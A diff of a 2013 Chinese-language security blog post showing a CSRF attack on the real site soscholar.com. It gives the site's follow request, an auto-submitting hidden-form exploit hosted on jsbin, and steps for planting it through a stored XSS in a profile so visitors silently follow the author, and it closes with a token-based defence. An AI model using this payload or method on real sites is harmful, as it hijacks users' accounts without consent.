@@ -6,8 +6,7 @@
 	<title>A blog of wliao</title>
     <meta name="author" content="wliao">
     
-	<meta name="description" content="Published on: Apr 16th, 2013 Tags: Security I&#8217;m quite new to web security. But today, I want to show you how to
-hack a site and try best to &hellip;">
+	<meta name="description" content="Published on: May 19th, 2013 Tags: Security, Web 今天我们看看OWASP TOP10的老四CRSF. 现在这种类型的漏洞越来越多,即使是GOOGLE、GITHUB这样的大哥们也经常犯这种错误.个人感觉如果结合好XSS的话功能非常强大. 小白鼠 &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -101,6 +100,142 @@ hack a site and try best to &hellip;">
 <!-- begin toload --> 
     <div id="content" class="inner">
         
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/blog/2013/05/19/crsf-on-soscholar/">
+		
+			CRSF on Soscholar</a>
+	</h2>
+    <div class="entry-content">
+    <div class="meta">
+      <div class="date">Published on: 
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-05-19T15:38:00+08:00" pubdate data-updated="true">May 19<span>th</span>, 2013</time></div>
+      <div class="tags">Tags: 
+
+
+	<a class='category' href='/blog/categories/security/'>Security</a>, <a class='category' href='/blog/categories/web/'>Web</a>
+
+
+</div>
+    </div>
+		<p>今天我们看看OWASP TOP10的老四CRSF.</p>
+
+<p>现在这种类型的漏洞越来越多,即使是<a href="http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/">GOOGLE</a>、<a href="http://homakov.blogspot.ru/2012/03/hacking-skrillformer-moneybookers.html">GITHUB</a>这样的大哥们也经常犯这种错误.个人感觉如果结合好XSS的话功能非常强大.</p>
+
+<h2>小白鼠</h2>
+
+<p>一如既往的<a href="http://soscholar.com">小白鼠</a>。</p>
+
+<p>soscholar的个人主页上面有XSS，所以我们可以试着在用户打开个人主页时，悄悄地让他关注我。</p>
+
+<h2>CRSF</h2>
+
+<p>原理就不说了，参见<a href="https://en.wikipedia.org/wiki/Cross-site_request_forgery">wikipedia</a>或者<a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery">OWASP</a>。</p>
+
+<p>我们来看看soscholar.com的关注请求。</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='http'><span class='line'><span class="nf">POST</span> <span class="nn">/friend/save</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span class='line'><span class="na">Host</span><span class="o">:</span> <span class="l">soscholar.com</span>
+</span><span class='line'><span class="na">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+</span><span class='line'><span class="na">Content-Length</span><span class="o">:</span> <span class="l">63</span>
+</span><span class='line'><span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
+</span><span class='line'><span class="na">Origin</span><span class="o">:</span> <span class="l">http://soscholar.com</span>
+</span><span class='line'><span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
+</span><span class='line'><span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.22 (KHTML,</span>
+</span><span class='line'><span class="err">like Gecko) Ubuntu Chromium/25.0.1364.160 Chrome/25.0.1364.160</span>
+</span><span class='line'>Safari/537.22
+</span><span class='line'>
+</span><span class='line'>follow_id=f035e41e-9ef0-11e1-962c-0025904b1f5a&amp;group_id=&amp;gname=
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>一个POST请求到/friend/save，数据为follow_id、group_id和gname，后面两个可以为空。<em>follow_id</em>就是个人的ID咯，在主页地址上可以看到。</p>
+
+<p>那么我们先来测试一下，开<a href="http://www.jsbin.com">jsbin</a>：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span><span class='line'><span class="c">&lt;!-- CSRF --&gt;</span>
+</span><span class='line'><span class="nt">&lt;html&gt;</span>
+</span><span class='line'><span class="nt">&lt;head&gt;</span>
+</span><span class='line'><span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">utf-8</span> <span class="nt">/&gt;</span>
+</span><span class='line'><span class="nt">&lt;title&gt;</span>JS Bin<span class="nt">&lt;/title&gt;</span>
+</span><span class='line'><span class="nt">&lt;/head&gt;</span>
+</span><span class='line'><span class="nt">&lt;body&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">&quot;container&quot;</span> <span class="na">frameborder=</span><span class="s">&quot;0&quot;</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</span><span class='line'><span class="nt">&lt;script&gt;</span>
+</span><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;form target=&quot;container&quot; id=&quot;test&quot; method=&quot;post&quot; action=&quot;http://soscholar.com/friend/save&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;follow_id&quot; value=&quot;6b879ba2-06f3-11e2-adc4-0025904b1f5a&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;group_id&quot; value=&quot;&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;gname&quot; value=&quot;&quot;&gt;&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;test&quot;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
+</span><span class='line'><span class="nt">&lt;/script&gt;</span>
+</span><span class='line'><span class="nt">&lt;/body&gt;</span>
+</span><span class='line'><span class="nt">&lt;/html&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>运行可以看到它并没阻止CSRF，请求完成。如果已经关注返回repeat（貌似还可以自己关注自己：），否则返回Success。</p>
+
+<h2>关注我</h2>
+
+<p>现在我们需要找个地方使用上面的代码了。在个人主页上修改联系地址（XSS在这哦），绕过验证（我喜欢直接拷贝check_form函数，在console里重新声明，
+然后修改HTML让点击调用去掉验证后的check_form2函数）。</p>
+
+<p>不过这里有个问题，代码太长了，就算修改input的最长输入长度，数据库中保存的字段也不够长。所以我精简了一下代码，直接用iframe嵌入放在jsbin
+上的代码。</p>
+
+<h2>结语</h2>
+
+<p>最终的结果可以见<a href="http://soscholar.com/user_profile?user_id=6b879ba2-06f3-11e2-adc4-0025904b1f5a">socholar.com</a>和<a href="http://jsbin.com/erimiw/2/edit">jsbin.com</a>。</p>
+
+<p>CSRF相对其他漏洞来说要麻烦很多，网上有很多措施。其中比较常见的是生成随机数，在COOKIE和REQUEST字段中同时设置，每个请求都要验证两者是相同的。</p>
+
+		
+		
+	</div>
+
+<div class="meta">
+	
+</div>
+</article>
 
 
     <article class="post">
